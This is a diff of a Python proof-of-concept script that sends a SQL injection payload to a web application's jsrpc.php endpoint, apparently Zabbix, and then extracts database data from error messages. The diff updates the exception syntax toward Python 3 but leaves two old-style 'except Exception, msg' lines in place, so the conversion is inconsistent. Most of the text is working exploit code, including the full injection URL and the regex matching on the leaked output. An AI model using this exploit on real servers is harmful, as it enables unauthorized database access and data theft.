@@ -24,8 +24,8 @@ def poc(url):
     payload_deteck = "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
     try:
         response = urllib2.urlopen(url + payload_deteck, timeout=10).read()
-    except Exception, msg:
-        # print msg
+    except Exception as msg:
+        # print( msg)
         pass
     else:
         key_reg = re.compile(r"INSERT\s*INTO\s*profiles")
@@ -37,7 +37,7 @@ def poc(url):
             try:
                 response = urllib2.urlopen(payload_inject, timeout=10).read()
             except Exception, msg:
-                # print msg
+                # print( msg)
                 pass
             else:
                 result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
@@ -49,7 +49,7 @@ def poc(url):
             try:
                 response = urllib2.urlopen(payload_inject, timeout=10).read()
             except Exception, msg:
-                # print msg
+                # print( msg)
                 pass
             else:
                 result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
